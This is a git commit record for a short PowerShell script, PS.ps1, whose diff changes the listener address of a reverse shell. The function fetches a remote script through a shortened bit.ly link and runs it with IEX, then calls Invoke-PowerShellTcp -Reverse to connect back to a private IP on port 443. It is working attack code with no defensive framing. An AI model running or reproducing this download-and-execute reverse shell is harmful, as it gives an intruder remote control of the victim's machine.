7dca9436e7ef47a1873a4ff11c220f12970bdf4e
lallouSs <47110370+lallouSs@users.noreply.github.com>
2019-01-28 16:39:41 +0200

    Update and rename PS to PS.ps1

--- PS.ps1
+++ PS.ps1
@@ -1,7 +1,7 @@
 function RunThis(){
     $wc = New-Object System.Net.Webclient
     IEX $wc.DownloadString("https://bit.ly/1RJwIiD")
-    Invoke-PowerShellTcp -Reverse -IPAddress 192.168.32.131 -Port 443
+    Invoke-PowerShellTcp -Reverse -IPAddress 10.13.251.215 -Port 443
 }
 
 Write-Host "Hello"
